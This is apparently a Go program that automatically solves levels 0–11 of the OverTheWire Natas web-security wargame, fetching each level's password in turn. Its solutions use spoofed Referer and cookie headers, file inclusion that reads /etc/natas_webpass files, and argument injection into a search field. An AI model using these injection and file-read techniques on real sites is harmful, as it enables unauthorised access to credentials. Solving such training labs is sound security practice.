package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"

	"github.com/MJKWoolnough/errors"
	"github.com/MJKWoolnough/memio"
)

var buf memio.Buffer

type Grabber interface {
	Grab(http.Request) (string, error)
}

type Prefixed struct {
	Prefix string
	Length int
}

func (p Prefixed) Grab(r http.Request) (string, error) {
	buf = buf[:0]
	resp, err := http.DefaultClient.Do(&r)
	if err != nil {
		return "", err
	}
	io.Copy(&buf, resp.Body)
	resp.Body.Close()
	index := bytes.Index(buf, []byte(p.Prefix))

	if index < 0 || len(buf) < index+len(p.Prefix)+p.Length {
		return "", errors.Error("failed to get password")
	}
	return string(buf[index+len(p.Prefix) : index+len(p.Prefix)+p.Length]), nil
}

type Path struct {
	Grabber
	Path string
}

func (p Path) Grab(r http.Request) (string, error) {
	oldPath := r.URL.Path
	r.URL.Path = p.Path
	s, err := p.Grabber.Grab(r)
	r.URL.Path = oldPath
	return s, err
}

type Headers struct {
	Grabber
	Headers SetData
}

func (h Headers) Grab(r http.Request) (string, error) {
	newHeaders := make(http.Header)
	for key, value := range r.Header {
		newHeaders[key] = value
	}
	if err := h.Headers.Set(r, newHeaders); err != nil {
		return "", err
	}
	r.Header = newHeaders
	return h.Grabber.Grab(r)
}

type Post struct {
	Grabber
	Data SetData
}

func (p Post) Grab(r http.Request) (string, error) {
	values := make(url.Values, len(p.Data))
	if err := p.Data.Set(r, values); err != nil {
		return "", err
	}
	m := memio.Buffer(values.Encode())
	r.Body = &m
	r.Method = http.MethodPost
	r.ContentLength = int64(len(m))
	h := Headers{p.Grabber, map[string]Grabber{"Content-Type": Text{"application/x-www-form-urlencoded"}}}
	return h.Grab(r)
}

type Get struct {
	Grabber
	Data SetData
}

func (g Get) Grab(r http.Request) (string, error) {
	values := make(url.Values, len(g.Data))
	if err := g.Data.Set(r, values); err != nil {
		return "", err
	}
	oldQuery := r.URL.RawQuery
	r.URL.RawQuery = values.Encode()
	s, err := g.Grabber.Grab(r)
	r.URL.RawPath = oldQuery
	return s, err
}

type Hex2Dec struct {
	Grabber
}

func (h Hex2Dec) Grab(r http.Request) (string, error) {
	hx, err := h.Grabber.Grab(r)
	if err != nil {
		return "", err
	}
	dec := make([]byte, hex.DecodedLen(len(hx)))
	_, err = hex.Decode(dec, []byte(hx))
	if err != nil {
		return "", err
	}
	return string(dec), nil
}

type Reverse struct {
	Grabber
}

func (rv Reverse) Grab(r http.Request) (string, error) {
	str, err := rv.Grabber.Grab(r)
	if err != nil {
		return "", err
	}
	rts := make([]byte, len(str))
	for n, b := range []byte(str) {
		rts[len(rts)-n-1] = b
	}
	return string(rts), nil
}

type Base64Decode struct {
	Grabber
}

func (b Base64Decode) Grab(r http.Request) (string, error) {
	str, err := b.Grabber.Grab(r)
	if err != nil {
		return "", err
	}
	res, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return "", err
	}
	return string(res), nil
}

type Cookie struct {
	Name string
}

func (c Cookie) Grab(r http.Request) (string, error) {
	r.Method = http.MethodHead
	resp, err := http.DefaultClient.Do(&r)
	if err != nil {
		return "", err
	}
	cookies := resp.Cookies()
	for _, cookie := range cookies {
		if cookie.Name == c.Name {
			return cookie.Value, nil
		}
	}
	return "", errors.Error("could not find cookie")
}

type SetData map[string]Grabber

type Setter interface {
	Set(string, string)
}

func (sd SetData) Set(r http.Request, s Setter) error {
	for key, g := range sd {
		value, err := g.Grab(r)
		if err != nil {
			return err
		}
		s.Set(key, value)
	}
	return nil
}

type Text struct {
	Text string
}

func (t Text) Grab(http.Request) (string, error) {
	return t.Text, nil
}

var levels = [...]Grabber{
	Prefixed{"The password for natas1 is ", 32},
	Prefixed{"The password for natas2 is ", 32},
	Path{Prefixed{"natas3:", 32}, "/files/users.txt"},  // image @ /files/pixel.png, go to folder, find users.txt
	Path{Prefixed{"natas4:", 32}, "/s3cr3t/users.txt"}, // robots.txt references /s3cr3t/, find users.txt
	Headers{Prefixed{"The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
	Headers{Prefixed{"The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
	Post{Prefixed{"The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{"$secret = \"", 19}, "/includes/secret.inc"}}},
	Get{Prefixed{"<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
	Post{Prefixed{"The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, "/index-source.html"}}}}}},
	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
}

func main() {
	var (
		level    uint
		password string
		err      error
	)
	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
	flag.StringVar(&password, "p", "natas0", "password for initial level")
	flag.Parse()

	r := http.Request{
		Header: make(http.Header),
	}

	for n, grabber := range levels[level:] {
		n += int(level)

		log.Printf("natas %2d: Solving...", n)

		r.URL, _ = url.Parse(fmt.Sprintf("http://natas%d.natas.labs.overthewire.org/", n))
		r.SetBasicAuth(fmt.Sprintf("natas%d", n), password)

		password, err = grabber.Grab(r)
		if err != nil {
			log.Printf("natas %2d: error: %s", n, err)
			return
		}
		log.Printf("natas %2d: Password: %s", n, password)
	}
}
